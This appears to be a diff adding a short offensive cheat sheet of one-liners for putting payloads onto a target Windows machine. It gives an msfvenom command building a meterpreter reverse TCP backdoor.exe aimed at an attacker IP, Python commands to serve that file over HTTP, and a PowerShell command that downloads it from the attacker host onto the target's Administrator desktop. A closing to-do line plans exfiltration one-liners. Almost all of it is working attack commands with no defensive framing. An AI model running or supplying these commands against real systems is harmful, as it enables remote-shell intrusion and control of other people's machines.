@@ -1,0 +1,18 @@
+#### Some quick one-liners for getting tools/payloads onto the target ####
+# generate a payload 
+
+$ msfvenom -p windows/meterpreter/reverse_tcp_allports LHOST=10.0.31.200 LPORT=4444 -f exe > backdoor.exe
+
+# Running the python SimpleHTTPServer to serve the backdoor.exe.
+$ python -m SimpleHTTPServer 80
+        -- OR --
+$ python3 -m http.server 80
+
+# Download the backdoor.exe on the target machine.
+# Open the PowerShell terminal and download the backdoor.exe.
+
+$ iwr -UseBasicParsing -Uri 'http://10.0.31.200/backdoor.exe' -OutFile 'C:\Users\Administrator\Desktop\backdoor.exe'
+
+
+## TO DO ##
+# add exfil one-liners
